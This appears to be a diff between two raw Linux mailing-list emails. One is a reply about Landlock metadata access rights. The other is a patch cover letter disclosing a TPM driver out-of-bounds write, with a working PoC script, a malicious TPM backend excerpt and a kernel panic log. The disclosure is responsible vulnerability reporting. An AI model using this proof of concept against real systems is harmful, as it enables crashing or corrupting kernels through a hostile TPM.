@@ -1,230 +1,264 @@
-Received: from canpmsgout11.his.huawei.com (canpmsgout11.his.huawei.com [113.46.200.226])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pz2-f12.google.com (mail-pz2-f12.google.com [74.125.228.12])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 13A88377A8A;
-	Mon, 28 Sep 2026 06:52:21 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=113.46.200.226
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3099A4746A5
+	for <linux-integrity@vger.kernel.org>; Mon, 28 Sep 2026 08:27:16 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.12
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1790578347; cv=none; b=GhwIK7rpTDFxDUOJlupaujJhou+zSk77wFLi5hZRFNnsm1pkbtt4aPdoBulJG9nAfmlQ+udvIlmgpD+QiO+mzLfn1qoJjI8UjT8TVLnUEoblB0gOfRk1E7bbIUjRqMoFE5AQdmezaGL8w9mQsKyi5Yd3bAGz2TJUUt91yWkUzJc=
+	t=1790584037; cv=none; b=UlDD0iawVoeX44pkvaDDUvmzr7vB1WNUF6oFdUaL/J8SmM07piPwkbmst/lZLDSWZ/KvHtcU4vdKANFHtjCNqsg41IRXQqKr3UvL1vXiTm1kXzjCVU5HpO585ADDxSyF0WX80FEU711RpeQQWdeJAwZFMkCirVTSDDF2AguTBUE=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1790578347; c=relaxed/simple;
-	bh=l99O4EFuTYgaVlJE6vpUwnoIBIsWomYu6FImDHQefNw=;
-	h=Message-ID:Date:MIME-Version:Subject:To:CC:References:From:
-	 In-Reply-To:Content-Type; b=Pcc4+n5IQamy6p4GXCQFIaMjKD5/vQh/ap5biYCdEQHtTg3vdY+Nf5fyt9VlzdICR3Rp9prLIyepv1SpmMXZqb5bE4mhOeZyAlrn9NPiH8cidCQm2QZ3Co7MtTPc/gj4ImoOk8etUBNP3ZReiHmMapeKKaezTDMGHLQMVQiutGc=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=huawei.com; spf=pass smtp.mailfrom=huawei.com; dkim=pass (1024-bit key) header.d=huawei.com header.i=@huawei.com header.b=tZ+wKmOM; arc=none smtp.client-ip=113.46.200.226
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=huawei.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=huawei.com
+	s=arc-20240116; t=1790584037; c=relaxed/simple;
+	bh=d8QXx4ChiRiDIOm45gzMPdgnBaY26o253IUrhGfKAuE=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=PcEZv83dCsm399FPOD/stFjKYBo8NYNtH+mjBmHxW17ZNrF3GF7vBGfB4KpPu2xT45shm6pgkE1c1pecJqFUzqTAvE7dMGwpGsEh/Uo4U1/lr0Z3qhGL9hJOCfITIPVatVuzHHBOnrBFvbqmsy2SQaBAukEkYqck06ULTaf8Y1g=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=prhpQ33j; arc=none smtp.client-ip=74.125.228.12
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=huawei.com header.i=@huawei.com header.b="tZ+wKmOM"
-dkim-signature: v=1; a=rsa-sha256; d=huawei.com; s=dkim;
-	c=relaxed/relaxed; q=dns/txt;
-	h=From;
-	bh=bF8dwco2OpD4jw+50IjUaWbm2lJ2kGH1r7RGZwU0W0U=;
-	b=tZ+wKmOMTbZczy4gL36DV6korVrDaOkEMaU77eNpngM0R1q31v2+V3uXwl+/ZcznRLqzPasUl
-	eIce1fwk7YKmARooBYj6Lqiw3GAaNlYP/36f2E2tCuWM4AXAFAu9UNw4dtAJP6Ye0pJE5lBixZP
-	fRIxJ9kXCs/c6I2hGflDe9Q=
-Received: from mail.maildlp.com (unknown [172.19.163.127])
-	by canpmsgout11.his.huawei.com (SkyGuard) with ESMTPS id 4htWrY3DnCzKmWP;
-	Mon, 28 Sep 2026 14:39:57 +0800 (CST)
-Received: from whupemk100010.china.huawei.com (unknown [7.152.184.41])
-	by mail.maildlp.com (Postfix) with ESMTPS id 2F7F640572;
-	Mon, 28 Sep 2026 14:52:09 +0800 (CST)
-Received: from [10.67.109.91] (10.67.109.91) by whupemk100010.china.huawei.com
- (7.152.184.41) with Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.2.2562.45; Mon, 28 Sep
- 2026 14:52:03 +0800
-Message-ID: <a6a40c38-0e1c-4a3f-a705-e4a38c575c25@huawei.com>
-Date: Mon, 28 Sep 2026 14:52:02 +0800
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="prhpQ33j"
+Received: by mail-pz2-f12.google.com with SMTP id 41be03b00d2f7-cc4d04d740cso910801a12.0
+        for <linux-integrity@vger.kernel.org>; Mon, 28 Sep 2026 01:27:16 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1790584035; x=1791188835; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=RR2+CsTWRIH6BA5IMa5GJVgH+MO3oOWM5IWmo+XxXFA=;
+        b=prhpQ33jp5vevkqW8QU+9YtHJQLpcr3eLTmT9pmC/VSxoWTLr+75655E2ajLx0P92n
+         525qDICeqdwrJmxHJ63z9ULJOJT6yVxQzDQh5RIf2pVxSj/wiNDN202rydivd7itndCF
+         ix8xcorV++uFswzcNP4o7vgVnmNA767kFtcVIpYtur5kwTAe0+zk3hxBUbgyJ3me27n8
+         231LuYyAWNHoUPFQuGipwZavNdgfMoPxwSFJo4zhpJAdXNaU8vaqJKR0QYpIUmxTeqZ3
+         yUPAW/9EK105cVVMwaDD0ArFZkE3+JLJkOh5bAgFLNpL+aPCED8AnmoH4B/iQvHRVtYr
+         aLng==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1790584035; x=1791188835;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=RR2+CsTWRIH6BA5IMa5GJVgH+MO3oOWM5IWmo+XxXFA=;
+        b=F2YvCU9pIwcCON6B2lJjjJWjU7q+6KA5jYpTUtiCPhACeEnnssIEZxN0G5mnUbKv94
+         XVcM12EzpnemH8wHMDDUmqLo2yxiDLqC4eLmJsF2Ff3QKCc2/tCF9s4SJSTH5PYxC+HO
+         SHjr6GUqKFZp9qeBE8N7yJzP5KM6b05+/55otcglqwUvbIURs+C556BtvQzU6z2FencB
+         33iNViBrLx6wmC4jXt1ZUeNysDHwbZX05c8rDkTAbbnjxDUQuy3zgLy6LBkW2kir/ILK
+         96Pvp8UdRane3vCWCIeeODqB4MzyKXNOs8rXB7KTDFbBFwGPdsbuNtZfKKNfDfMfT+B5
+         wfXQ==
+X-Gm-Message-State: AFq9FYLXFcrE532SqEQjDVRjIkKdsXDe4hS2QLkstFFUeKlFW79w0PPS
+	VuopZsl2enZuCmMujoZqEp+tBXgJLpz7Bt9R3Sxj9ZusIEYJYuOKgDv5l2HFsEnb5XGRIg==
+X-Gm-Gg: AYBFou1SwoFUDoQNWFYTf7ecgofBpYxqjE8RiYlADDTiRePAWv5aus+zJYOSLAJ/oyw
+	tg2XzQ1f9Htry8iL8Ek3dv+b2nFSD6RySXFmyrTFYYvyKe0Nsb8xV5LrRLnCtwf9VLQKQZfRpp5
+	dif4hnwWI42WFjAZvgObBklZ9qPxqCOYvm8SHbkk+x3iMHGCpDUPHqI3Ggb9wYmH7NAZWm9KM9X
+	gUZUUrmrFsTHewD1uqzdinRqDTpLoXjZ/cfXB0Oh8q9JkbDtHOfqLV4eTpK9kS2w7jytRg1VNXJ
+	atVp1PL4lHSfGEjdtee1aVWzt5/FX8j8x4L3MNDVMu8qcLZaqu8qH0F+a8W3wVXOz2qEj6H+jSo
+	pFv4zEkbd2UcH0nMskkp8xdWxjOeDXKlpmOHJmTI79yCMiCynUMnpyDkgwl8wLsleFze+Eygkkh
+	40eoMrXJuedPnu1lY3rpQQHhZfZGI1bN1EEi5tn1dnTNxOCGIYDAfxCtN/EbF+dRji1MxIV+Iim
+	L/i7vcTf4tqw42avy2fzq9xvx1jKkWzDbF3WWDV48ABD84A9h1kZYuAb1d2JTxS/HbcWfRSgTMm
+	cwB8Gj1q
+X-Received: by 2002:a17:90b:3887:b0:3a2:b70b:9cc3 with SMTP id 98e67ed59e1d1-3a2b70bb06emr2056612a91.8.1790584035184;
+        Mon, 28 Sep 2026 01:27:15 -0700 (PDT)
+Received: from lenovo-thinkbook.lenovo.com (42-2-127-248.static.netvigator.com. [42.2.127.248])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a0b9589f7esm19265257a91.10.2026.09.28.01.27.07
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 28 Sep 2026 01:27:14 -0700 (PDT)
+From: Yuqi Xu <xuyuqiabc@gmail.com>
+To: linux-integrity@vger.kernel.org
+Cc: Peter Huewe <peterhuewe@gmx.de>,
+	Jarkko Sakkinen <jarkko@kernel.org>,
+	Jason Gunthorpe <jgg@ziepe.ca>,
+	Jerry Snitselaar <jsnitsel@redhat.com>,
+	James Bottomley <James.Bottomley@HansenPartnership.com>,
+	stable@vger.kernel.org,
+	Vega <vega@nebusec.ai>,
+	Ren Wei <weir@nebusec.ai>,
+	xuyq21@lenovo.com
+Subject: [PATCH v2 0/1] tpm: reject duplicate PCR banks in tpm2_get_pcr_allocation
+Date: Mon, 28 Sep 2026 16:26:59 +0800
+Message-ID: <cover.1790568982.git.xuyuqiabc@gmail.com>
+X-Mailer: git-send-email 2.55.0
 Precedence: bulk
 X-Mailing-List: linux-integrity@vger.kernel.org
 List-Id: <linux-integrity.vger.kernel.org>
 List-Subscribe: <mailto:linux-integrity+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-integrity+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH RFC -next 00/12] landlock: Add READ_METADATA and
- WRITE_METADATA access rights
-To: =?UTF-8?Q?G=C3=BCnther_Noack?= <gnoack3000@gmail.com>
-CC: <mic@digikod.net>, <gnoack@google.com>, <paul@paul-moore.com>,
-	<jmorris@namei.org>, <serge@hallyn.com>, <corbet@lwn.net>,
-	<skhan@linuxfoundation.org>, <rdunlap@infradead.org>,
-	<gregkh@linuxfoundation.org>, <rafael@kernel.org>, <dakr@kernel.org>,
-	<dlemoal@kernel.org>, <hch@lst.de>, <axboe@kernel.dk>,
-	<viro@zeniv.linux.org.uk>, <brauner@kernel.org>, <jack@suse.cz>,
-	<dhowells@redhat.com>, <code@tyhicks.com>, <linkinjeon@kernel.org>,
-	<sj1557.seo@samsung.com>, <yuezhang.mo@sony.com>,
-	<hirofumi@mail.parknet.co.jp>, <cel@kernel.org>, <jlayton@kernel.org>,
-	<neil@brown.name>, <okorniev@redhat.com>, <Dai.Ngo@oracle.com>,
-	<tom@talpey.com>, <miklos@szeredi.hu>, <amir73il@gmail.com>,
-	<senozhatsky@chromium.org>, <chenxiaosong@chenxiaosong.com>,
-	<zohar@linux.ibm.com>, <roberto.sassu@huawei.com>,
-	<dmitry.kasatkin@gmail.com>, <eric.snowberg@oracle.com>,
-	<stephen.smalley.work@gmail.com>, <omosnacek@gmail.com>,
-	<casey@schaufler-ca.com>, <nanx95726@gmail.com>, <djwong@kernel.org>,
-	<daniel@iogearbox.net>, <linux-security-module@vger.kernel.org>,
-	<linux-doc@vger.kernel.org>, <linux-kernel@vger.kernel.org>,
-	<driver-core@lists.linux.dev>, <linux-block@vger.kernel.org>,
-	<linux-fsdevel@vger.kernel.org>, <netfs@lists.linux.dev>,
-	<ecryptfs@vger.kernel.org>, <exfat@lists.linux.dev>,
-	<linux-nfs@vger.kernel.org>, <linux-unionfs@vger.kernel.org>,
-	<linux-cifs@vger.kernel.org>, <linux-integrity@vger.kernel.org>,
-	<selinux@vger.kernel.org>, <linux-kselftest@vger.kernel.org>,
-	<xiujianfeng@huawei.com>, <lujialin4@huawei.com>, <bpf@vger.kernel.org>,
-	<kpsingh@kernel.org>, <matt@bobrowski.net>, <alexei.starovoitov@gmail.com>
-References: <20260924104831.1081137-1-caixinchen1@huawei.com>
- <20260926.e0135fe7712f@gnoack.org>
-Content-Language: en-US
-From: Cai Xinchen <caixinchen1@huawei.com>
-In-Reply-To: <20260926.e0135fe7712f@gnoack.org>
-Content-Type: text/plain; charset="UTF-8"; format=flowed
 Content-Transfer-Encoding: 8bit
-X-ClientProxiedBy: kwepems100001.china.huawei.com (7.221.188.238) To
- whupemk100010.china.huawei.com (7.152.184.41)
 
-Thank you for review!
+Hi Linux kernel maintainers,
 
-I will link the feature request
-(https://github.com/landlock-lsm/linux/issues/11) in the v2 cover letter.
+We found and validated an issue in drivers/char/tpm/tpm2-cmd.c.
+The bug is triggered by an attacker-controlled TPM 2.0 backend that
+returns duplicate PCR bank selections in its TPM2_CAP_PCRS response
+during device probe.
+We've tested it, and it should not affect any other functionality.
 
-For https://github.com/landlock-lsm/linux/issues/18, the current
-READ_METADATA cannot solve this problem, and I don't have a good idea 
-for now.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-For path_* rename, I'd rather keep the inode_* names:
+Changes in v2:
+ - Return -EIO on a duplicate PCR bank instead of silently ignoring
+   it, as requested by Jarkko Sakkinen.
+ - v1 Link: https://lore.kernel.org/all/cover.1789800840.git.xuyuqiabc@gmail.com/
 
-* There is precedent for the mismatch: the inode_getattr hook
-   upstream already takes a "const struct path *" (this series just
-   aligns the other metadata hooks with it).
+---- details below ----
 
-* The path_* prefix has an established meaning in the LSM hook
-   interface: it denotes the pathname-based (TOMOYO/AppArmor-style)
-   hooks that are invoked at the VFS path level *before* the
-   corresponding inode_* hook, as a paired, duplicate check
-   serving a different class of LSMs.  For example, a chmod(2)
-   currently runs security_path_chmod() (fs/open.c, for TOMOYO and
-   AppArmor) and then, via notify_change(),
-   security_inode_setattr() (for SELinux, Smack and now Landlock);
-   vfs_mknod() similarly calls both security_path_mknod() and
-   security_inode_mknod().  Renaming inode_setattr to
-   path_setattr would put two path_-prefixed hooks with different
-   call contracts into the same syscall, and path_chown(path,
-   uid, gid) next to a path_setattr(path, attr) would read as a
-   redundant pair, even though they belong to different hook
-   families.  Landlock itself already uses the path_* family for
-   its real path-level hooks (e.g. path_truncate for the TRUNCATE
-   right), so mixing renamed inode hooks into that prefix would
-   also blur its own hook table.
+Bug details:
 
-* If the consensus is that these hooks should be renamed, I think
-   that should be a standalone, tree-wide rename series (including
-   inode_getattr), so that BPF programs only break once instead of
-   twice.
+`struct tpm_chip` reserves `chip->groups` as an array with only
+`3 + TPM_MAX_HASHES` slots (8, with TPM_MAX_HASHES = 5).
+`tpm2_get_pcr_allocation()` parses the TPM2_CAP_PCRS response and adds
+every selection with a non-zero `pcr_select` to `chip->allocated_banks[]`.
+It rejects more than `TPM2_MAX_PCR_BANKS` (8) selections but never checks
+that the hash algorithm is unique.  `tpm_sysfs_add_device()` then stores
+the device group plus one PCR group per allocated bank with
+`chip->groups[chip->groups_cnt++]`, so eight duplicate SHA1 banks make it
+write index 8 of an 8-element array, before the trailing
+`WARN_ON(chip->groups_cnt > TPM_MAX_HASHES + 1)`.
 
-On 9/26/2026 4:27 PM, Günther Noack wrote:
-> On Thu, Sep 24, 2026 at 06:48:19PM +0800, Cai Xinchen wrote:
->> This series adds two new Landlock filesystem access rights,
->> LANDLOCK_ACCESS_FS_READ_METADATA and LANDLOCK_ACCESS_FS_WRITE_METADATA,
->> which control access to file and directory metadata such as inode
->> attributes (mode, ownership, timestamps), extended attributes and POSIX
->> ACLs.  It picks up the work from the "landlock: add chmod and chown
->> support" series [1] and follows the coarse-grained grouping discussed in
->> that thread [2]: instead of separate chmod/chown rights, metadata
->> operations are grouped into one read and one write right.
->>
->> Landlock evaluates access rights on a per-path basis, but the metadata
->> related LSM hooks (inode_getattr, inode_setattr, inode_setxattr,
->> inode_getxattr, inode_listxattr, inode_removexattr, inode_set_acl,
->> inode_get_acl, inode_remove_acl) only receive the dentry of the accessed
->> object.  Patches 1-7 therefore first pass struct path instead of dentry
->> through the metadata-related VFS helpers and LSM hooks.  This is a pure
->> refactoring with no behavior change, split so that every patch builds
->> and works on its own:
->>
->>    1: notify_change() and its callers
->>    2: inode_setsecctx hook (must come before 3: the SELinux and Smack
->>       implementations call __vfs_setxattr_locked internally)
->>    3: xattr helpers, which also drops a redundant EVM xattr size sanity
->>       check whose vfs_getxattr() call only has a dentry and therefore
->>       cannot be migrated to the new path-based signature
->>    4: POSIX ACL helpers
->>    5: inode_setattr hook
->>    6: inode xattr hooks
->>    7: inode POSIX ACL hooks
->>
->> Two deliberate scoping decisions for this refactor:
->>
->> - The hooks consistently take struct path rather than struct file.  The
->>    VFS call sites involved (chmod(2), chown(2), utimensat(2), xattr(2)
->>    and ACL syscalls) operate on paths, and several of them (lstat(2),
->>    lchown(2), llistxattr(2), ...) have no struct file to begin with.
->>
->> - struct inode_operations->setattr still receives (idmap, dentry, attr).
->>    Only the VFS boundary (notify_change()) and the LSM hook layer see the
->>    path, which keeps the refactor contained to fs/attr.c and the LSM
->>    infrastructure instead of touching every filesystem.
->>
->> Patches 8-12 then implement the new rights, their tests, the sandboxer
->> sample and the documentation.  Semantics:
->>
->> - READ_METADATA covers stat(2) and friends, getxattr(2) and friends,
->>    listxattr(2) and friends, and POSIX ACL reads.
->> - WRITE_METADATA covers chmod(2), chown(2), utimensat(2), setxattr(2),
->>    removexattr(2) and friends, and POSIX ACL set and remove.
->> - Only explicit metadata changes requested by user space are restricted.
->>    Implicit changes performed by the kernel (e.g. timestamp updates on
->>    write(2), size changes on truncate(2)) are not, and neither are
->>    chmod(2)/chown(2) calls that change nothing (e.g. chown(2) with
->>    (-1, -1), which never reaches the hook), matching the SELinux
->>    inode_setattr behavior.
->> - Kernel-internal accesses performed with override_creds() (e.g.
->>    overlayfs, cachefiles) and kernel threads without a Landlock domain
->>    (e.g. nfsd, ksmbd) are not restricted.
->>
->> The Landlock ABI version is incremented from 11 to 12.
->>
->> The series is based on linux-next commit 5c4d4169604b ("Add linux-next
->> specific files for 20260921").
->>
->> Testing: each patch has been built for aarch64 (gcc, -Werror) and the
->> landlock selftests (445 tests, including the new ones) pass in QEMU on
->> aarch64; base_test reports ABI v12.
->>
->> [1] https://lore.kernel.org/all/20220827111215.131442-1-xiujianfeng@huawei.com/
->> [2] https://lore.kernel.org/all/abc960a1-e66e-792e-6869-cfd201c29dbe@digikod.net/
-> Thank you for sending this patch set!
->
-> Some meta-remarks at the beginning:
->
-> * You might want to link the bugtracker feature request:
->    https://github.com/landlock-lsm/linux/issues/11
-> * In the final version, I think it's preferred to merge patches 8
->    (adding the access right enums) and 9 (adding the LSM hooks that use
->    them).  Having the feature as an atomic commit makes it harder to
->    accidentally mess it up during a backport, because you can't patch 8
->    without 9.
-> * As Paul alluded to, the changes to the LSM hook interface and to the
->    existing callers in VFS are likely the hardest part of this patch
->    set.  Alexei from the BPF subsystem has also reiterated recently
->    that he wants BPF to be looped into such changes.  BPF hooks do not
->    give the same backwards compatibility guarantees as the syscall
->    layer, but there are existing users of LSM hooks specifically
->    through the BPF LSM.
->
-> * In https://github.com/landlock-lsm/linux/issues/18, we came across
->    statfs(), which returns file system meta-information based for the
->    file system that a given file belongs to.  I have weak confidence
->    that READ_METADATA would be the right access right to protect this
->    with, but it's a somewhat related operation.  Maybe you have some
->    thoughts on this?
->
-> More concrete questions:
->
-> * If a "inode" LSM hook gets a "path" argument now, should it be
->    renamed from "inode_..." to "path_..."?
->
->    (Maybe the BPF people can chime in about to what extent that would
->    cause additional churn for BPF users, in a situation where they
->    anyway already need to make a change due to the changing function
->    signature?)
->
-> –Günther
+The TPM response is external input: a malicious or buggy TPM 2.0 backend
+can report the same bank eight times and drive the out-of-bounds write
+during `tpm_chip_register()` -> `tpm_sysfs_add_device()`.
+
+Return -EIO when a hash algorithm is reported twice. The TPM
+protocol does not allow that duplicate, so the chip is not enabled
+instead of silently dropping the extra selection.
+
+Reproducer:
+
+ cd /root
+ ./poc.sh
+
+poc.sh starts malicious_tpm.py, a small swtpm-control-protocol backend
+that answers TPM2_CAP_PCRS with eight duplicate SHA1 selections, and boots
+a kernel with `-device tpm-tis` pointing at it.  The script defaults
+KERNEL_SRC to linux-lts-v6.12.74 and treats tpm-sysfs.c:513 as success.
+That default tree is not the build in the crash log below.
+
+The captured run is 7.3.0-rc3-00322-gab411db3c3b1 on a 2 vCPU, 2 GB RAM
+x86 QEMU/KVM guest, with CONFIG_TCG_TPM, CONFIG_TCG_TIS and
+CONFIG_UBSAN_BOUNDS enabled and panic_on_warn=1 on the command line.
+UBSAN in that log reports tpm-sysfs.c:517.  CONFIG_TCG_TPM2_HMAC is
+disabled so the probe reaches TPM2_CAP_PCRS without the fake backend
+having to answer CREATE_PRIMARY.
+
+------BEGIN poc.sh------
+
+#!/usr/bin/env bash
+set -euo pipefail
+
+DIR="$(cd -- "$(dirname -- "$0")" && pwd)"
+KERNEL_SRC="${1:-/home/data/data/repos/linux-repos/linux-lts-v6.12.74}"
+CTRL_SOCK="$(mktemp -u /tmp/malicious-tpm-XXXXXX.sock)"
+BACKEND_LOG="${DIR}/backend.log"
+RAW_QEMU_LOG="${DIR}/qemu-raw.log"
+QEMU_LOG="${DIR}/qemu.log"
+
+cleanup() {
+  if [[ -n "${BACKEND_PID:-}" ]] && kill -0 "${BACKEND_PID}" 2>/dev/null; then
+    kill -TERM "${BACKEND_PID}" 2>/dev/null || true
+    wait "${BACKEND_PID}" 2>/dev/null || true
+  fi
+  rm -f "${CTRL_SOCK}"
+}
+trap cleanup EXIT
+
+: > "${BACKEND_LOG}"
+
+python3 "${DIR}/malicious_tpm.py" --ctrl "${CTRL_SOCK}" --log "${BACKEND_LOG}" &
+BACKEND_PID=$!
+
+echo "backend log: ${BACKEND_LOG}"
+echo "raw qemu log: ${RAW_QEMU_LOG}"
+echo "sanitized qemu log: ${QEMU_LOG}"
+echo "The VM should exit on its own after the panic. If it does not, kill the printed pid."
+
+script -q -f "${RAW_QEMU_LOG}" -c "${DIR}/qemu-start-kernel-tpm.sh ${KERNEL_SRC} ${CTRL_SOCK}"
+perl -pe 's/\e\[[0-9;?]*[ -\/]*[@-~]//g; s/\ec//g; s/\r//g' "${RAW_QEMU_LOG}" > "${QEMU_LOG}"
+
+if grep -q 'UBSAN: array-index-out-of-bounds in ../drivers/char/tpm/tpm-sysfs.c:513:16' "${QEMU_LOG}" &&
+   grep -q 'Kernel panic - not syncing: UBSAN: panic_on_warn set' "${QEMU_LOG}"; then
+  echo "Trigger confirmed. See ${QEMU_LOG}"
+else
+  echo "Trigger not observed. See ${QEMU_LOG} and ${BACKEND_LOG}" >&2
+  exit 1
+fi
+
+------END poc.sh--------
+
+------BEGIN malicious_tpm.py excerpt------
+
+ALG_SHA1 = 0x0004
+
+def build_get_cap_pcrs():
+    entries = []
+    for _ in range(8):
+        entries.append(be16(ALG_SHA1) + b"\x03" + b"\x01\x00\x00")
+    payload = b"\x00" + be32(TPM2_CAP_PCRS) + be32(8) + b"".join(entries)
+    return build_header(TPM2_RC_SUCCESS, payload)
+
+        if cap == TPM2_CAP_PCRS:
+            return build_get_cap_pcrs()
+
+------END malicious_tpm.py excerpt------
+
+Captured 7.3.0-rc3 log (7.3.0-rc3-00322-gab411db3c3b1).  This is not
+the script's default linux-lts-v6.12.74 tree.
+
+----BEGIN crash log----
+
+[    0.487531] ------------[ cut here ]------------
+[    0.487533] UBSAN: array-index-out-of-bounds in /home/lucas/work/net-tpm-675/drivers/char/tpm/tpm-sysfs.c:517:16
+[    0.487535] index 8 is out of range for type 'attribute_group *[8]'
+[    0.487538] CPU: 0 UID: 0 PID: 1 Comm: swapper/0 Not tainted 7.3.0-rc3-00322-gab411db3c3b1 #2 PREEMPT(lazy) 
+[    0.487541] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.17.0-10.fc44 06/10/2025
+[    0.487542] Call Trace:
+[    0.487553]  <TASK>
+[    0.487555]  dump_stack_lvl+0x4d/0x70
+[    0.487561]  ubsan_epilogue+0x5/0x2b
+[    0.487564]  __ubsan_handle_out_of_bounds.cold+0x4e/0x58
+[    0.487567]  tpm_sysfs_add_device+0x29f/0x380
+[    0.487573]  tpm_chip_register+0x3d/0x1e0
+[    0.487576]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    0.487579]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    0.487580]  tpm_tis_core_init.cold+0x1bc/0x3a1
+[    0.487584]  tpm_tis_plat_probe+0x101/0x130
+[    0.487588]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    0.487590]  platform_probe+0x74/0xc0
+[    0.487594]  ? driver_sysfs_add+0x50/0x80
+[    0.487596]  really_probe+0xdd/0x290
+[    0.487597]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    0.487599]  __driver_probe_device+0x99/0x180
+[    0.487601]  ? __pfx___driver_attach+0x10/0x10
+[    0.487602]  driver_probe_device+0x1a/0xa0
+[    0.487604]  ? __pfx___driver_attach+0x10/0x10
+[    0.487605]  __driver_attach+0xab/0x180
+[    0.487607]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    0.487608]  bus_for_each_dev+0x92/0xf0
+[    0.487611]  bus_add_driver+0x104/0x220
+[    0.487613]  ? __pfx_init_tis+0x10/0x10
+[    0.487617]  driver_register+0x70/0xe0
+[    0.487619]  init_tis+0x9b/0xf0
+[    0.487623]  do_one_initcall+0x84/0x260
+[    0.487626]  kernel_init_freeable+0x249/0x2c0
+[    0.487630]  ? __pfx_kernel_init+0x10/0x10
+[    0.487633]  kernel_init+0x1b/0x140
+[    0.487635]  ? __pfx_kernel_init+0x10/0x10
+[    0.487637]  ret_from_fork+0x196/0x260
+[    0.487640]  ? __pfx_kernel_init+0x10/0x10
+[    0.487641]  ? __pfx_kernel_init+0x10/0x10
+[    0.487643]  ret_from_fork_asm+0x1a/0x30
+[    0.487646]  </TASK>
+[    0.487647] ---[ end trace ]---
+[    0.487648] Kernel panic - not syncing: UBSAN: panic_on_warn set ...
+
+-----END crash log-----
+
+Best regards,
+Yuqi Xu
+
+Yuqi Xu (1):
+  tpm: reject duplicate PCR banks in tpm2_get_pcr_allocation
+
+ drivers/char/tpm/tpm2-cmd.c | 18 ++++++++++++++++++
+ 1 file changed, 18 insertions(+)
+
+
+base-commit: ab411db3c3b1fd0c70a36fb32c96b2c60175210b
+-- 
+2.55.0
